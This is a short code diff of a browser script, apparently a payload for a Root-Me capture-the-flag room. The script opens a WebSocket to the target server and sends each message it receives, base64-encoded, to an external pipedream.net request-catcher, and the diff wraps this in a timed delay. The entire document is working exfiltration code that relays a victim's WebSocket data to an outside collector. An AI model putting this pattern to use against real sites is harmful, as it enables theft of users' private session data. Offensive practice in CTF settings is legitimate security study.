@@ -1,6 +1,7 @@
 <script>
     let v = open("http://ctf22.root-me.org/room");
     fetch('https://eocvkn4m3kpce3q.m.pipedream.net?cyka', {mode: 'no-cors'});
+  setTimeout(() => {
     var websocket = new WebSocket('ws://ctf22.root-me.org/ws');
     websocket.onopen = start;
   websocket.onmessage = handleReply;
@@ -8,7 +9,9 @@
     websocket.send("hello");
   }
   function handleReply(event) {
-    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+btoa(event.data), {mode: 'no-cors'});
+    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+btoa(event.data), {mode: 'no-cors'})
   }
+
+}, 1000)
 
 </script>
